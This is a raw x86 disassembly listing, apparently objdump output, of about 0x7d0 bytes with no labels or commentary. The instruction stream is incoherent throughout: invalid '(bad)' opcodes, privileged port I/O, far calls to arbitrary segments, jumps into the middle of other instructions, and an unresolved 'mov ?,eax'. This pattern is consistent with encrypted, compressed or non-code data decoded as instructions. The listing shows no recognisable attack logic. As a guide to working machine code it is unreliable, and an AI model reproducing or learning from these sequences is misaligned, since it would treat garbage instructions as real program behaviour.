  416dc9:	jo     0x416d93
  416dcb:	out    dx,al
  416dcc:	cwde   
  416dcd:	fnstcw WORD PTR ds:0xe9d42366
  416dd3:	aas    
  416dd4:	div    DWORD PTR [ebx+0x13d298a5]
  416dda:	pop    esp
  416ddb:	fild   DWORD PTR [ecx-0x1f]
  416dde:	pop    edx
  416ddf:	mov    ebp,0x86222167
  416de4:	stc    
  416de5:	les    eax,FWORD PTR [ebx]
  416de7:	push   esp
  416de8:	mov    esi,0x2023f467
  416ded:	out    0xb4,al
  416def:	(bad)  
  416df0:	or     eax,0x8dbe4107
  416df5:	jns    0x416dc2
  416df7:	sbb    al,0xd0
  416df9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416dfa:	xchg   edi,eax
  416dfb:	clc    
  416dfc:	not    DWORD PTR ds:0x48dfb214
  416e02:	mov    eax,0x81125a1d
  416e07:	pop    ebx
  416e08:	mov    ds:0x7e98ec04,al
  416e0d:	call   0xe9d0:0x81d353aa
  416e14:	jbe    0x416e2c
  416e16:	pop    esp
  416e17:	jge    0x416e96
  416e19:	sub    bl,BYTE PTR [edi+0x6e]
  416e1c:	out    dx,al
  416e1d:	adc    eax,0xe563c1ea
  416e22:	and    edi,DWORD PTR [ebx+0x17a5f4f2]
  416e28:	adc    esp,esp
  416e2a:	test   DWORD PTR [ecx],esp
  416e2c:	aaa    
  416e2d:	mov    cl,BYTE PTR [eax]
  416e2f:	mov    esp,0x682d058c
  416e34:	add    ebp,esi
  416e36:	(bad)  
  416e37:	stos   BYTE PTR es:[edi],al
  416e38:	dec    ecx
  416e39:	mov    ebp,0x9fe9e1d4
  416e3e:	or     ch,BYTE PTR [eax-0x3]
  416e41:	or     al,0x80
  416e43:	popf   
  416e44:	mov    ss,WORD PTR [ebx+0x16c4eb95]
  416e4a:	mov    dh,0x49
  416e4c:	arpl   WORD PTR [edx-0x1f153c30],cx
  416e52:	cmp    DWORD PTR [esi+0x6053f78f],0xffffff9d
  416e59:	pushf  
  416e5a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416e5b:	or     BYTE PTR [ecx+0x622d6566],bh
  416e61:	in     al,dx
  416e62:	pop    es
  416e63:	sub    DWORD PTR [ebx],ebx
  416e65:	shr    BYTE PTR ds:0xb0ebbeb1,0xd7
  416e6c:	into   
  416e6d:	(bad)  
  416e6e:	fisttp DWORD PTR [edi-0x68]
  416e71:	pop    ebp
  416e72:	repnz inc di
  416e75:	and    bl,BYTE PTR [ecx]
  416e77:	and    al,cl
  416e79:	mov    esi,0x36b418a7
  416e7e:	and    eax,0x9916bcc5
  416e83:	sar    DWORD PTR [ebp+0x56],1
  416e86:	cmp    BYTE PTR [eax],cl
  416e88:	dec    eax
  416e89:	push   ss
  416e8a:	fsub   DWORD PTR [ecx+0x2b]
  416e8d:	or     DWORD PTR [ebx+0x30],0xc
  416e91:	scas   eax,DWORD PTR es:[edi]
  416e92:	(bad)  
  416e93:	leave  
  416e94:	call   DWORD PTR [ebx+edx*2-0xa]
  416e98:	xchg   esp,eax
  416e99:	arpl   ax,bx
  416e9b:	jg     0x416e54
  416e9d:	inc    esp
  416e9e:	jecxz  0x416e32
  416ea0:	push   ebx
  416ea1:	out    0xa3,eax
  416ea3:	dec    edx
  416ea4:	lds    ecx,FWORD PTR [ecx]
  416ea6:	in     al,0xba
  416ea8:	xor    al,0x74
  416eaa:	inc    ebx
  416eac:	int3   
  416ead:	jne    0x416e85
  416eaf:	icebp  
  416eb0:	ja     0x416e93
  416eb2:	mov    ah,0x89
  416eb4:	loop   0x416ea4
  416eb6:	mov    al,0x3f
  416eb8:	fmul   QWORD PTR [ecx-0x7e5b8623]
  416ebe:	mov    bh,0x3f
  416ec0:	out    0xb4,eax
  416ec2:	jmp    0xfac8:0x66f979cf
  416ec9:	lods   eax,DWORD PTR ds:[esi]
  416eca:	xor    bl,BYTE PTR [eax+0x67861813]
  416ed0:	clc    
  416ed1:	xchg   ecx,eax
  416ed2:	fistp  DWORD PTR [edx+0x45]
  416ed5:	(bad)  
  416ed6:	jne    0x416e7e
  416ed8:	mov    ah,0xb5
  416eda:	mov    esp,0xdff38475
  416edf:	and    dh,dh
  416ee1:	mov    bl,0x51
  416ee3:	imul   eax,DWORD PTR ss:[ebp+eiz*4-0x1cd23d33],0x69
  416eec:	or     BYTE PTR [ecx-0x6051c91a],bh
  416ef2:	aas    
  416ef3:	mov    ?,eax
  416ef5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416ef6:	jnp    0x416f21
  416ef8:	sbb    ecx,DWORD PTR [edi-0x254195d4]
  416efe:	dec    ebx
  416eff:	mov    dl,0x52
  416f01:	xlat   BYTE PTR ds:[ebx]
  416f02:	xlat   BYTE PTR ss:[ebx]
  416f04:	scas   al,BYTE PTR es:[edi]
  416f05:	call   0xd0780a27
  416f0a:	pop    ds
  416f0b:	mov    ds:0x24867569,eax
  416f10:	arpl   WORD PTR [edi-0x176a4317],ax
  416f16:	sbb    ebx,ebx
  416f18:	mov    edi,0xc2e2cf6d
  416f1d:	or     dh,BYTE PTR [edi+0x4126a526]
  416f23:	test   DWORD PTR [ecx+0x6319866f],esi
  416f29:	cmp    edi,0xe73db3bb
  416f2f:	dec    ebx
  416f30:	not    BYTE PTR [eax]
  416f32:	mov    esp,0xdc4e9071
  416f37:	adc    DWORD PTR gs:[edi-0x2c],eax
  416f3b:	bound  edx,QWORD PTR [ebp+0x50]
  416f3e:	cmp    ecx,edx
  416f40:	sbb    eax,0xd3adf743
  416f45:	xchg   ebp,eax
  416f46:	repz das 
  416f48:	mov    ebp,0x6d7c4e05
  416f4d:	ins    DWORD PTR es:[edi],dx
  416f4e:	scas   al,BYTE PTR es:[edi]
  416f4f:	mov    esp,0xec8bd3a8
  416f54:	mov    dl,0xb7
  416f56:	mov    ebx,0x546b6fa6
  416f5b:	dec    esi
  416f5c:	fsubr  QWORD PTR [ebp+edi*2+0x76]
  416f60:	xchg   bl,cl
  416f62:	retf   0x171f
  416f65:	fcom   DWORD PTR [ecx+eax*4+0x6e63282a]
  416f6c:	aas    
  416f6d:	inc    ecx
  416f6e:	test   DWORD PTR [esi],edi
  416f70:	mov    bl,0xe5
  416f72:	sbb    DWORD PTR [ebx+0x628befce],eax
  416f78:	sbb    eax,DWORD PTR [esi]
  416f7a:	jge    0x416fb2
  416f7c:	dec    esi
  416f7d:	mov    ch,0x81
  416f7f:	mov    bl,0x3f
  416f81:	icebp  
  416f82:	outs   dx,BYTE PTR ds:[esi]
  416f83:	xchg   esp,eax
  416f84:	xor    ebx,DWORD PTR [esp+eax*2+0x3f]
  416f88:	in     al,dx
  416f89:	test   BYTE PTR [edi-0x61],0x72
  416f8d:	ficomp WORD PTR [eax+0x760fa98c]
  416f93:	nop
  416f94:	sbb    DWORD PTR ds:0xfee7b3ac,edi
  416f9a:	adc    bl,BYTE PTR [esi-0x71]
  416f9d:	mov    al,0x1d
  416f9f:	push   ecx
  416fa0:	call   0x9bfa1a7d
  416fa5:	and    ecx,0xffffffa8
  416fa8:	dec    ecx
  416fa9:	add    esi,edx
  416fab:	sub    DWORD PTR [ebp-0x2d8c9e5f],edi
  416fb1:	or     DWORD PTR cs:[ecx+esi*2],esp
  416fb5:	icebp  
  416fb6:	xchg   DWORD PTR [ebx-0x21],edx
  416fb9:	mov    dl,0x19
  416fbb:	fwait
  416fbc:	mov    DWORD PTR [esi-0x48],edi
  416fbf:	inc    ebx
  416fc0:	ja     0x417029
  416fc2:	xor    DWORD PTR [esi+ebx*8],esi
  416fc5:	addr16 xor al,0x5d
  416fc8:	xlat   BYTE PTR gs:[ebx]
  416fca:	jecxz  0x416f4d
  416fcc:	jbe    0x416f9f
  416fce:	jb     0x416f5f
  416fd0:	pop    eax
  416fd1:	ja     0x416f86
  416fd3:	mov    dh,0x27
  416fd5:	shl    bl,cl
  416fd7:	sbb    ecx,DWORD PTR [edi+0x73ccd96a]
  416fdd:	mov    dh,0xce
  416fdf:	mov    ch,BYTE PTR [edx]
  416fe1:	add    edx,DWORD PTR [ecx-0x2438eac]
  416fe7:	mov    ecx,0x90ef64c
  416fec:	in     eax,0x77
  416fee:	push   eax
  416fef:	xchg   edi,eax
  416ff0:	xchg   edi,eax
  416ff1:	cld    
  416ff2:	ss mov bh,0xe9
  416ff5:	imul   esi,ecx,0x74
  416ff8:	inc    ecx
  416ff9:	leave  
  416ffa:	cld    
  416ffb:	xchg   ecx,eax
  416ffc:	into   
  416ffd:	mov    eax,ds:0xca895a5a
  417002:	pop    ss
  417003:	and    eax,0xaaee30f2
  417008:	and    ch,BYTE PTR [ecx+0x609bbcf7]
  41700e:	jp     0x41702c
  417010:	mov    ch,0x26
  417012:	mov    ch,0xe1
  417014:	inc    ebx
  417015:	push   ecx
  417016:	sahf   
  417017:	or     eax,0x2882358d
  41701c:	pop    ss
  41701d:	retf   
  41701e:	add    BYTE PTR [esi-0x62],0x41
  417022:	jno    0x417058
  417024:	(bad)  
  417025:	fimul  WORD PTR [ecx+ebp*8]
  417028:	push   esi
  417029:	scas   eax,DWORD PTR es:[edi]
  41702a:	or     BYTE PTR ds:0xed85ba4d,ch
  417030:	shl    BYTE PTR [ecx+0x68],cl
  417033:	sbb    ecx,DWORD PTR [esi-0x1969a83e]
  417039:	adc    eax,0x54ba6eeb
  41703e:	jge    0x41709e
  417040:	xchg   ecx,eax
  417041:	test   al,0xb1
  417043:	jne    0x416fc9
  417045:	xor    BYTE PTR [ecx-0x34],dl
  417048:	and    bl,cl
  41704a:	les    eax,FWORD PTR [ebx+ebp*4]
  41704d:	and    al,ah
  41704f:	xor    eax,0xfc4726dd
  417054:	nop
  417055:	(bad)  
  417056:	cmp    esi,ebx
  417058:	rol    BYTE PTR [edx],0x60
  41705b:	call   0x7d6a:0xfaf1eb5c
  417062:	in     eax,dx
  417063:	add    DWORD PTR [ecx],ebp
  417065:	int3   
  417066:	xchg   ecx,eax
  417067:	jmp    0x417094
  417069:	stos   DWORD PTR es:[edi],eax
  41706a:	sub    BYTE PTR [esi],al
  41706c:	add    DWORD PTR [edx+0x4165e655],esi
  417072:	fbstp  TBYTE PTR [edi+eiz*4+0x1d]
  417076:	fisttp QWORD PTR [edi-0x1e]
  417079:	xchg   edi,eax
  41707a:	push   ebx
  41707b:	retf   0xfb75
  41707e:	cmp    eax,0x353b72fe
  417083:	pop    esi
  417084:	sbb    eax,0xc82284be
  417089:	or     eax,0x570d5058
  41708e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41708f:	dec    esi
  417090:	mov    al,ds:0x39f9bf1b
  417095:	jmp    0xbcb35908
  41709a:	inc    ecx
  41709b:	dec    esi
  41709c:	aam    0x8
  41709e:	mov    ch,0x5c
  4170a0:	mov    ds:0x1e762845,eax
  4170a5:	push   esi
  4170a6:	movlps xmm3,QWORD PTR [ebp-0x756bfd7a]
  4170ad:	mov    ch,0xb0
  4170af:	(bad)  
  4170b2:	push   ss
  4170b3:	xor    al,0xde
  4170b5:	mov    cl,0x51
  4170b7:	mov    esi,0x8bcbd5ae
  4170bc:	xor    BYTE PTR [ebx+edx*8],al
  4170bf:	(bad)
  4170c2:	imul   edx,DWORD PTR [ebx],0x2c
  4170c5:	pop    ecx
  4170c6:	adc    edi,DWORD PTR [ecx]
  4170c8:	fst    st(7)
  4170ca:	mov    dh,BYTE PTR [ebx+eiz*8]
  4170cd:	xor    al,0xbd
  4170cf:	add    eax,0x89df1738
  4170d4:	rcr    DWORD PTR [eax+0x23ee8636],1
  4170da:	mov    cl,0xe2
  4170dc:	pop    edi
  4170dd:	iret   
  4170de:	jno    0x41712d
  4170e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4170e1:	mov    esi,0x63fde01e
  4170e6:	sar    DWORD PTR [edi+0x5d3038e7],1
  4170ec:	ins    BYTE PTR es:[edi],dx
  4170ed:	mov    ah,0xd9
  4170ef:	test   DWORD PTR [esi],ecx
  4170f1:	repz and eax,0x43ccacca
  4170f7:	push   esi
  4170f8:	cli    
  4170f9:	push   ebp
  4170fa:	pusha  
  4170fb:	cli    
  4170fc:	(bad)  
  4170fd:	(bad)  
  4170ff:	(bad)  
  417100:	and    al,0xd2
  417102:	icebp  
  417103:	ret    
  417104:	xchg   esi,eax
  417105:	ret    0x3a0d
  417108:	test   cl,cl
  41710a:	jae    0x417108
  41710c:	mov    edx,0xbd6744b2
  417111:	push   0xe5800d69
  417116:	in     eax,0xe
  417118:	mov    ds:0x584574c1,eax
  41711d:	xchg   esi,eax
  41711e:	jae    0x41715e
  417120:	jmp    0x3969:0xd1660267
  417127:	mov    al,0x98
  417129:	xor    DWORD PTR [edx-0x8],edi
  41712c:	test   ecx,ebp
  41712e:	adc    al,0x9c
  417130:	mov    dh,0xeb
  417132:	lea    esp,[ebx+edx*1-0x24]
  417136:	adc    al,0xf7
  417138:	js     0x4170d8
  41713a:	mov    esi,0xbd9146c6
  41713f:	sbb    BYTE PTR ds:0xc8d2d1ff,dl
  417145:	cld    
  417146:	outs   dx,DWORD PTR ds:[esi]
  417147:	mov    DWORD PTR [ebp-0x70fe855e],ecx
  41714d:	lods   eax,DWORD PTR ds:[esi]
  41714e:	cwde   
  41714f:	das    
  417150:	mov    ebx,0x8d946fbb
  417155:	mov    edx,0x60125ac7
  41715a:	mov    bh,0x95
  41715c:	mov    ah,al
  41715e:	mov    dh,0x57
  417160:	loope  0x4170e3
  417162:	retf   0xc401
  417165:	jl     0x417187
  417167:	aas    
  417168:	dec    esi
  417169:	mov    esi,0x54090601
  41716e:	scas   eax,DWORD PTR es:[edi]
  41716f:	xor    ebx,DWORD PTR [ecx]
  417171:	push   esi
  417172:	js     0x41715b
  417174:	xlat   BYTE PTR ds:[ebx]
  417175:	pop    esi
  417176:	inc    edi
  417177:	xchg   al,bl
  417179:	push   eax
  41717a:	ja     0x41711d
  41717c:	dec    ecx
  41717d:	imul   ebp,esi,0xd41649db
  417183:	(bad)  
  417184:	pop    edi
  417185:	sbb    DWORD PTR [eax+0x4a27c631],ebp
  41718b:	cmp    esp,DWORD PTR [edx]
  41718d:	pop    ss
  41718e:	xor    al,0x39
  417190:	adc    eax,0xa11637d5
  417195:	xor    ah,cl
  417197:	mov    bl,0xcc
  417199:	div    DWORD PTR [ecx]
  41719b:	mov    esi,0x2f2e7457
  4171a0:	dec    ebp
  4171a1:	and    DWORD PTR [ebx-0x37cc8b22],esi
  4171a7:	lods   al,BYTE PTR ds:[esi]
  4171a8:	xchg   BYTE PTR [eax-0x53cf8471],bh
  4171ae:	xchg   BYTE PTR [edi+0x4],ch
  4171b1:	ins    BYTE PTR es:[edi],dx
  4171b2:	xchg   esi,eax
  4171b3:	adc    dl,BYTE PTR [esi]
  4171b5:	push   ss
  4171b6:	mov    gs,ecx
  4171b8:	js     0x417230
  4171ba:	xchg   DWORD PTR [ebp+0x6a],esp
  4171bd:	std    
  4171be:	das    
  4171bf:	outs   dx,DWORD PTR ds:[esi]
  4171c0:	daa    
  4171c1:	gs mov ch,0xb7
  4171c4:	aas    
  4171c5:	sbb    BYTE PTR [esi+0x22],bl
  4171c8:	jbe    0x4171a3
  4171ca:	sbb    BYTE PTR [eax+0x9],dl
  4171cd:	cmp    al,0x14
  4171cf:	clc    
  4171d0:	fisttp QWORD PTR [ecx+0x57]
  4171d3:	fcomp  DWORD PTR [ecx+0x6e]
  4171d6:	mov    ds:0xaf6ca152,al
  4171db:	nop
  4171dc:	mov    DWORD PTR [edx+ebx*8-0x75],ebp
  4171e0:	pop    ebx
  4171e1:	dec    ebx
  4171e2:	mov    dh,0xa4
  4171e4:	int    0xc8
  4171e6:	test   BYTE PTR [esi-0x3],cl
  4171e9:	sbb    al,0xc0
  4171eb:	xor    al,0x7f
  4171ed:	xchg   DWORD PTR [eax+0x38],esp
  4171f0:	xor    al,0xfd
  4171f2:	repnz neg DWORD PTR [eax+0x39]
  4171f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4171f7:	and    al,0x45
  4171f9:	fcomp  st(5)
  4171fb:	inc    BYTE PTR [ecx+0x6a]
  4171fe:	mov    esp,0x8e17bb66
  417203:	jmp    0x417224
  417205:	mov    eax,0x5794143e
  41720a:	mulps  xmm4,XMMWORD PTR [ebp+0x31]
  41720e:	jno    0x417191
  417210:	mov    eax,ds:0x53ed8069
  417215:	cmc    
  417216:	cmp    BYTE PTR [ebx],cl
  417218:	fwait
  417219:	push   edi
  41721a:	(bad)  
  41721b:	sbb    BYTE PTR [ecx],ah
  41721d:	sub    BYTE PTR [eax],ah
  41721f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417220:	pop    ebx
  417221:	push   eax
  417222:	pop    ecx
  417223:	cmp    BYTE PTR [eax-0x1d128b13],bl
  417229:	pop    ebx
  41722a:	dec    ebp
  41722b:	mov    al,ds:0x8e0c68a3
  417230:	es mov eax,0x435083a1
  417236:	inc    ebp
  417237:	and    DWORD PTR [edx+edx*8],ecx
  41723a:	lea    ecx,[edx+0x5]
  41723d:	xchg   esi,eax
  41723e:	shl    BYTE PTR [ecx-0x55],cl
  417241:	repnz push esi
  417243:	mov    ebp,0x85a03a91
  417248:	ja     0x4172c9
  41724a:	xor    eax,0x9d75ee3a
  41724f:	rcl    BYTE PTR [ebp-0x14],cl
  417252:	adc    eax,0x5971ef5c
  417257:	push   ecx
  417258:	cld    
  417259:	(bad)  
  41725a:	stc    
  41725b:	add    eax,0x501a1a0
  417261:	mov    dl,0xff
  417263:	rcl    dl,cl
  417265:	jge    0x4172ce
  417267:	or     ax,0xef87
  41726b:	add    BYTE PTR [ebx],ch
  41726d:	retf   0x86c4
  417270:	adc    eax,0x952c3a5a
  417275:	push   ss
  417276:	repz das 
  417278:	(bad)  
  417279:	adc    eax,0x575ed650
  41727e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41727f:	mov    ds:0x95e5f54b,al
  417284:	rcl    bl,0xb8
  417287:	add    edx,DWORD PTR [edx-0x40]
  41728a:	ss jge 0x4172eb
  41728d:	mov    dh,BYTE PTR [ebx+eiz*8]
  417290:	idiv   BYTE PTR [edi+0x34e7c4f4]
  417296:	sbb    al,0x61
  417298:	imul   esi,edi,0x80577f6c
  41729e:	int    0x69
  4172a0:	xchg   ebx,eax
  4172a1:	addr16 push 0xffffffca
  4172a4:	icebp  
  4172a5:	push   ebp
  4172a6:	or     ecx,DWORD PTR [esi-0x1ff1fa3]
  4172ac:	inc    esi
  4172ad:	(bad)  
  4172ae:	cmc    
  4172af:	or     al,0xc
  4172b1:	adc    al,0x38
  4172b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4172b4:	outs   dx,DWORD PTR ds:[esi]
  4172b5:	gs cwde 
  4172b7:	call   0xf3246559
  4172bc:	mov    BYTE PTR [esi-0x34ffe2b],dh
  4172c2:	inc    eax
  4172c3:	adc    ah,BYTE PTR [edi+0x3b6e3f8a]
  4172c9:	inc    esp
  4172ca:	push   ss
  4172cb:	outs   dx,BYTE PTR ds:[esi]
  4172cc:	pusha  
  4172cd:	dec    esp
  4172ce:	lock xor ch,BYTE PTR [eax+0x7a]
  4172d2:	inc    esi
  4172d3:	cs (bad) 
  4172d5:	or     ebx,ebp
  4172d7:	or     eax,DWORD PTR [esi+0x14]
  4172da:	ins    BYTE PTR es:[edi],dx
  4172db:	out    dx,eax
  4172dc:	jge    0x41729a
  4172de:	scas   al,BYTE PTR es:[edi]
  4172df:	or     al,0xe5
  4172e1:	push   0x1d69154e
  4172e6:	js     0x417312
  4172e8:	jl     0x4172f4
  4172ea:	popf   
  4172eb:	rcl    BYTE PTR [esi+0x426a9c75],1
  4172f1:	adc    edx,DWORD PTR [ebp+ebp*4+0x36]
  4172f5:	or     al,0x45
  4172f7:	pop    ebx
  4172f8:	mov    ecx,0xd054d01b
  4172fd:	pop    es
  4172fe:	fst    QWORD PTR [esi+0x529eb733]
  417304:	(bad)  
  417305:	inc    ebp
  417306:	mov    edx,0x7ec4a59c
  41730b:	imul   eax,esp,0x41
  41730e:	mov    edi,0xb6a55f0b
  417313:	aas    
  417314:	lock push cs
  417316:	push   cs
  417317:	ins    BYTE PTR es:[edi],dx
  417318:	fldenv [ebp-0x27a0a995]
  41731e:	mov    bl,0xc3
  417320:	adc    eax,0x412c1f19
  417325:	(bad)  
  417326:	enter  0xdc4,0x9d
  41732a:	jmp    0x4172bd
  41732c:	add    ebx,DWORD PTR [edx]
  41732e:	das    
  41732f:	xchg   ecx,eax
  417330:	dec    edx
  417331:	mov    edx,0x70899bc3
  417336:	push   ebp
  417337:	ja     0x4172ce
  417339:	and    cl,ch
  41733b:	rol    BYTE PTR fs:[ecx+0x35],cl
  41733f:	fst    DWORD PTR [ebx]
  417341:	imul   DWORD PTR [edx+0x197de75b]
  417347:	jl     0x417322
  417349:	cwde   
  41734a:	push   esi
  41734b:	ret    0x517e
  41734e:	mov    ecx,0x83a0785e
  417353:	jg     0x417341
  417355:	add    BYTE PTR [esi+0x12371a8],ch
  41735b:	sbb    DWORD PTR [edx+ebp*8],0x70
  41735f:	sbb    al,0xb7
  417361:	pop    esi
  417362:	cmp    al,0x31
  417364:	ror    DWORD PTR ds:0x3a73bcc7,1
  41736a:	jae    0x4173cd
  41736c:	mov    esp,esp
  41736e:	mov    ds:0x85d75dc,eax
  417373:	add    BYTE PTR [esi],al
  417375:	mov    al,0xa9
  417377:	int3   
  417378:	ins    DWORD PTR es:[edi],dx
  417379:	sbb    al,0xc6
  41737b:	add    ah,BYTE PTR [esp+ecx*4]
  41737e:	mov    ch,0xd0
  417380:	clc    
  417381:	lds    ebp,FWORD PTR [edi-0x24]
  417384:	and    al,0x5b
  417386:	push   edx
  417387:	ror    BYTE PTR [edi+0x70117f58],cl
  41738d:	add    eax,0xc26de50b
  417392:	dec    ebp
  417393:	loop   0x41734a
  417395:	ss cs jnp 0x41736b
  417399:	popa   
  41739a:	in     al,dx
  41739b:	outs   dx,DWORD PTR fs:[esi]
  41739d:	sub    dl,BYTE PTR [esi-0x51a45a89]
  4173a3:	test   BYTE PTR [ebp+0x419d184a],ch
  4173a9:	jge    0x41734b
  4173ab:	xor    ecx,DWORD PTR [ebx-0x5f]
  4173ae:	scas   al,BYTE PTR es:[edi]
  4173af:	adc    ebx,DWORD PTR [ebp-0x43]
  4173b2:	lods   al,BYTE PTR ds:[esi]
  4173b3:	sub    DWORD PTR [eax-0x67da179f],0xffffff9d
  4173ba:	cmp    DWORD PTR [edx-0x181d4417],esp
  4173c0:	xchg   ebp,eax
  4173c1:	sbb    edi,esp
  4173c3:	imul   esp,DWORD PTR [edx-0x5e],0xc168b70a
  4173ca:	mov    ah,dl
  4173cc:	push   esi
  4173cd:	or     cl,BYTE PTR [eax+0x15]
  4173d0:	pushf  
  4173d1:	add    esi,DWORD PTR [ebx]
  4173d3:	adc    eax,0xfe51075a
  4173d8:	bound  ebp,QWORD PTR ds:0x9142a88b
  4173de:	ja     0x4173c7
  4173e0:	lods   eax,DWORD PTR ds:[esi]
  4173e1:	icebp  
  4173e2:	jmp    0x417382
  4173e4:	pop    esi
  4173e5:	jp     0x41740b
  4173e7:	inc    esi
  4173e8:	cmc    
  4173e9:	push   esp
  4173ea:	sahf   
  4173eb:	(bad)  
  4173ec:	cs ins DWORD PTR es:[edi],dx
  4173ee:	cdq    
  4173ef:	sub    bh,ch
  4173f1:	ret    
  4173f2:	add    ebp,DWORD PTR [ebx]
  4173f4:	daa    
  4173f5:	fcmovbe st,st(5)
  4173f7:	dec    edi
  4173f8:	cmc    
  4173f9:	scas   al,BYTE PTR es:[edi]
  4173fa:	test   bh,bl
  4173fc:	lahf   
  4173fd:	call   0x51eddffa
  417402:	and    eax,0xf0b4bfd4
  417407:	xchg   BYTE PTR ds:0x7048288c,bh
  41740d:	test   eax,0xd15f45ef
  417412:	out    dx,al
  417413:	pop    ss
  417414:	dec    edx
  417415:	aas    
  417416:	cmp    eax,edi
  417418:	pop    ss
  417419:	nop
  41741a:	mov    bl,0xab
  41741c:	inc    eax
  41741d:	iret   
  41741e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41741f:	or     eax,0xb8a6f967
  417424:	ror    BYTE PTR [ebx+0x19d3e14d],0xff
  41742b:	aas    
  41742c:	arpl   WORD PTR [ecx-0x137536a2],si
  417432:	mov    ds:0x937132a9,eax
  417437:	ficomp WORD PTR [eax]
  417439:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41743a:	loop   0x4173cd
  41743c:	lahf   
  41743d:	fadd   DWORD PTR [edi]
  41743f:	mov    al,ds:0xe7cc7b7f
  417444:	data16 ja 0x41748a
  417447:	inc    edx
  417448:	push   0xffffffda
  41744a:	push   edx
  41744b:	pop    ecx
  41744c:	jecxz  0x417419
  41744e:	in     al,dx
  41744f:	mov    edi,0x469e15e6
  417454:	mov    cl,dh
  417456:	sub    al,0x81
  417458:	lods   al,BYTE PTR ds:[esi]
  417459:	or     ah,0xac
  41745c:	and    BYTE PTR [ebp+0x26],bl
  41745f:	je     0x417435
  417461:	or     al,0xc7
  417463:	call   0x406ca43d
  417468:	(bad)  
  417469:	xor    dl,bl
  41746b:	adc    ecx,DWORD PTR [ebx-0x55]
  41746e:	outs   dx,BYTE PTR gs:[esi]
  417470:	add    al,0xd6
  417472:	mov    esp,DWORD PTR [edi+0x387c7a0b]
  417478:	jle    0x417446
  41747a:	sbb    DWORD PTR [eax-0x4d],edi
  41747d:	xchg   BYTE PTR [esi+0x6930df9c],cl
  417483:	dec    eax
  417484:	les    esp,FWORD PTR [ebx+ebp*4]
  417487:	bndldx (bad),[edi-0x1e396f76]
  41748e:	stos   DWORD PTR es:[edi],eax
  41748f:	in     al,0xce
  417491:	in     eax,0xae
  417493:	pusha  
  417494:	cmp    DWORD PTR [edi],edx
  417496:	cli    
  417497:	push   es
  417498:	xchg   BYTE PTR [edx],bh
  41749a:	std    
  41749b:	iret   
  41749c:	xor    edi,0xffffffee
  41749f:	lock adc eax,0xc9314025
  4174a5:	mov    cl,0xce
  4174a7:	xchg   ebp,eax
  4174a8:	(bad)  
  4174a9:	mov    ebp,DWORD PTR [ebp+0x64]
  4174ac:	push   es
  4174ad:	les    esp,FWORD PTR [edx+0x674f2f4c]
  4174b3:	hlt    
  4174b4:	push   ecx
  4174b5:	and    ecx,ebp
  4174b7:	aaa    
  4174b8:	pop    esi
  4174b9:	sbb    bl,BYTE PTR [ecx+0x8]
  4174bc:	adc    cl,bl
  4174be:	jmp    FWORD PTR [esi-0x7a]
  4174c1:	jo     0x417492
  4174c3:	mov    ecx,?
  4174c5:	outs   dx,DWORD PTR ds:[esi]
  4174c6:	lods   eax,DWORD PTR ds:[esi]
  4174c7:	sbb    ebx,esi
  4174c9:	adc    eax,0xc735b896
  4174ce:	pusha  
  4174cf:	ret    0xddda
  4174d2:	cmp    eax,0x7292727c
  4174d7:	pushf  
  4174d8:	les    edx,FWORD PTR [edx]
  4174da:	jg     0x4174e2
  4174dc:	mov    ds:0x19e76b19,al
  4174e1:	ret    0xd5ab
  4174e4:	mov    edi,0x9810d94a
  4174e9:	push   edi
  4174ea:	fs into 
  4174ec:	cmp    cl,ah
  4174ee:	mov    bh,0x5c
  4174f0:	idiv   DWORD PTR [esi-0x5c0fc17e]
  4174f6:	cdq    
  4174f7:	popa   
  4174f8:	cmc    
  4174f9:	or     bh,dl
  4174fb:	mov    eax,ds:0x8c98f54e
  417500:	push   ds
  417501:	shr    edi,cl
  417503:	iret   
  417504:	stc    
  417505:	in     eax,dx
  417506:	aas    
  417507:	call   0x816dac43
  41750c:	(bad)  
  41750d:	fdiv   st(2),st
  41750f:	dec    ebp
  417510:	mov    dl,0x63
  417512:	lods   al,BYTE PTR ds:[esi]
  417513:	ins    BYTE PTR es:[edi],dx
  417514:	and    eax,0xd332d1a6
  417519:	mov    esp,0xd7dbb8f
  41751e:	jb     0x417507
  417520:	sbb    eax,0x328754d3
  417525:	or     al,0x4e
  417527:	std    
  417528:	mov    edi,0xeb4a037
  41752d:	popf   
  41752e:	ror    DWORD PTR [ecx],cl
  417530:	or     BYTE PTR [eax-0x3b],ah
  417533:	push   edx
  417534:	jbe    0x417502
  417536:	mov    cl,0xbd
  417538:	out    0xbd,al
  41753a:	lds    ecx,FWORD PTR [ebp-0x76]
  41753d:	dec    eax
  41753e:	or     eax,0xb12c8edf
  417543:	mov    al,0xca
  417545:	jnp    0x41759d
  417547:	scas   al,BYTE PTR es:[edi]
  417548:	sbb    eax,0x2560ce28
  41754d:	mov    ebx,0xb3363d10
  417552:	or     al,0x26
  417554:	inc    esi
  417555:	loopne 0x417584
  417557:	(bad)  
  417558:	lahf   
  417559:	js     0x4175ab
  41755b:	add    edx,0x15a59a03
  417561:	rol    DWORD PTR [ebp-0x1f01a826],0xd6
  417568:	adc    al,0xe9
  41756a:	push   esi
  41756b:	pop    eax
  41756c:	cmp    DWORD PTR [ebx+0x2e51edb],ebx
  417572:	fidivr DWORD PTR [ebx+0x27]
  417575:	ins    DWORD PTR es:[edi],dx
  417576:	jle    0x41754b
  417578:	add    al,0x20
  41757a:	add    dl,BYTE PTR [ebp+0x30eaec23]
  417580:	or     edx,DWORD PTR [ebp+0x18]
  417583:	jbe    0x4175e0
  417585:	cli    
  417586:	mov    ch,0x10
  417588:	jg     0x4175ae
  41758a:	test   al,0x2b
  41758c:	xor    BYTE PTR [ecx],0x8f
  41758f:	push   ebp
  417590:	dec    ecx
  417591:	bound  ebp,QWORD PTR ds:[edx-0x3867d569]
  417598:	(bad)  
  417599:	das    
  41759a:	pop    esi
  41759b:	retf   0x9aa8
  41759e:	adc    eax,0xa2a4b92a
  4175a3:	sub    ecx,eax
